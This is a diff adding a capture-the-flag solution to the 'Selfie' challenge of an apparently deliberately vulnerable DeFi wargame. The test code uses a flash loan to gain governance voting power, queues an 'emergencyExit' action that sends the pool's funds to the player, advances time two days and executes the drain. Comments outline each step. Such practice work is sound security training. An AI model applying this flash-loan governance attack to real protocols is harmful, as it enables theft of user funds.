@@ -39,6 +39,17 @@ describe('[Challenge] Selfie', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const attackContractFactory = await ethers.getContractFactory('SelfieAttack', player);
+        const attackContract = await attackContractFactory.deploy(pool.address, token.address, governance.address);
+        const calldata = pool.interface.encodeFunctionData("emergencyExit", [player.address]); 
+        await attackContract.attack(TOKENS_IN_POOL, calldata);
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
+        await governance.connect(player).executeAction(1);
+
+        // get flash loan, take token snapshot
+        // initiate action in governance contract since you have enough tokens
+        // return the tokens
+        // after 2 days you can execute the emergency fund drain action
     });
 
     after(async function () {
